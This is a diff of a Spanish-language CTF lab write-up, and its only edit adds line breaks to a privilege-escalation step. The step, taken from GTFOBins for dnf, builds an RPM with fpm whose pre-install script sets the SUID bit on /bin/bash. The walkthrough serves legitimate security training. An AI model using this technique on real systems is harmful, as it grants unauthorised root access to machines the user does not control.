@@ -63,8 +63,8 @@ Aparentemente, somos el usuario "primpi" y estamos en el directorio raíz (**/**
 
 Buscamos en [https://gtfobins.github.io/](https://gtfobins.github.io/) la sección correspondiente a "***dnf***" e introducimos los comandos que nos pone en la terminal de nuestra máquina Kali atacante.
 
-**TF=$(mktemp -d)
-echo 'chmod u+s /bin/bash' > $TF/x.sh
+**TF=$(mktemp -d)<br>
+echo 'chmod u+s /bin/bash' > $TF/x.sh<br>
 fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF**
 
   ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/29c58322-2b89-45d4-8230-03fd01b7ba8d)
